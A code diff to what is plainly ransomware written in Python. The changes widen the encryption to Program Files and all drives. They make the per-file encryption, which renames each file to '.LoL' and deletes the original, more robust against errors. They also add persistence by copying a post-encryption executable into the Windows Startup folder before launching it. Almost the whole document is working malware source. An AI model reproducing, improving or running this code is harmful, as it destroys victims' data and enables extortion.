@@ -13,6 +13,7 @@ from PIL import Image, ImageDraw, ImageFont
 from tkinter import Label, Entry
 import subprocess
 import pathlib
+import shutil
 
 fileName=sys.argv[0]
 afterFileName='Client_after_enc.exe'
@@ -65,19 +66,24 @@ class Encryptor:
 
     @classmethod
     def encEach(self, path):
-        with open(path, "rb") as File:
-            data=File.read()
-        encryptedFile=EncryptModule.encrypt(data)
-        with open(f"{path}.LoL", "wb") as File:
-            File.write(encryptedFile)
-        os.remove(path)
+        try:
+            with open(path, "rb") as File:
+                data=File.read()
+            encryptedFile=EncryptModule.encrypt(data)
+            with open(f"{path}.LoL", "wb") as File:
+                File.write(encryptedFile)
+            os.remove(path)
+        except (PermissionError, FileNotFoundError):
+            if(os.path.isfile(f"{path}.LoL")):
+                os.remove(f"{path}.LoL")
 
     def encryptFile(self):
-        try:
-            for file in self._files:
-                if(os.path.isfile(file)==True):
-                    if(file==sys.argv[0] or afterFileName in file):
-                        return
+        for file in self._files:
+            if(os.path.isfile(file)==True):
+                if(file==sys.argv[0] or afterFileName in file):
+                    return
+                    
+                try:
                     if(os.path.getsize(file)>500000000):
                         if (len(ThreadPool)<MaxThread):
                             th=Thread(target=Encryptor.encEach, args=(file,))
@@ -85,11 +91,10 @@ class Encryptor:
                             th.start()
                         else:
                             self.encEach(file)
-                    else :
+                    else:
                         self.encEach(file)
-                
-        except Exception as e:
-            pass
+                except Exception as e:
+                    pass
 
 def setEncryptModule():
     global EncryptModule
@@ -97,16 +102,15 @@ def setEncryptModule():
 
 def listUpTargetDir():
     global PathList
-    PathList=[r"C:\Users\\"]
+    PathList=[r"C:\Users\\", r"C:\Program Files\\", r"C:\Program Files (x86)\\"]
     for letter in range(97, 123):
         drive=f"{chr(letter)}:\\"
         if (pathlib.Path(drive).exists()):
             PathList.append(drive)
-    PathList.remove("c:\\")
+    PathList.remove("C:\\")
 
 def recursiveEncrypt(basepath):
     try:
-        global ThreadPool
         files=[]
         dirs=[]
         for entry in os.listdir(basepath):
@@ -151,7 +155,13 @@ def doEnc():
     while (len(ThreadPool)!=0):
         th=ThreadPool.pop()
         th.join()
+        
     dumpVariable()
+    try:
+        shutil.copyfile(afterFileName, r"C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Client_after_enc.exe")
+    except Exception as e:
+        pass
+        
     os.system(afterFileName)
     sys.exit()
             
